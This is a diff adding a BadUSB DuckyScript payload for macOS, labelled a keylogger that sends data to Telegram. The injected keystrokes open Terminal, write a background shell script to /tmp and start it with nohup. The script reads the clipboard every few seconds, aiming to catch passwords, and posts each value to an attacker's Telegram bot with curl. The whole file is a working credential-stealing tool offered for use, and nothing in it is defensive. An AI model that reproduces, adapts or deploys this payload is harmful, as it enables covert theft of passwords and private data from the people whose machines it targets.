@@ -1,0 +1,43 @@
+REM Title: macOS Keylogger to Telegram
+REM Author: BadUSB Library
+REM Description: Logs keystrokes and sends to Telegram
+REM Target: macOS 10.15+
+REM Category: Authentication
+REM Type: Configuration Needed
+
+REM *SETUP*
+REM Replace TELEGRAM_BOT_TOKEN with your Telegram Bot Token
+REM Replace TELEGRAM_CHAT_ID with your Telegram Chat ID
+
+REM Open Terminal
+DELAY 2000
+GUI SPACE
+DELAY 1000
+STRING Terminal
+ENTER
+DELAY 3000
+
+REM Create keylogger script
+STRING cat > /tmp/keylogger.sh << 'EOF'
+#!/bin/bash
+BOT_TOKEN="TELEGRAM_BOT_TOKEN"
+CHAT_ID="TELEGRAM_CHAT_ID"
+while true; do
+    # Monitor clipboard for passwords
+    clipboard=$(pbpaste 2>/dev/null)
+    if [ ! -z "$clipboard" ]; then
+        curl -s -X POST "https://api.telegram.org/bot${BOT_TOKEN}/sendMessage" -d chat_id="${CHAT_ID}" -d text="Clipboard: $clipboard"
+    fi
+    sleep 5
+done
+EOF
+ENTER
+DELAY 2000
+
+STRING chmod +x /tmp/keylogger.sh
+ENTER
+DELAY 1000
+
+STRING nohup /tmp/keylogger.sh > /dev/null 2>&1 &
+ENTER
+DELAY 2000
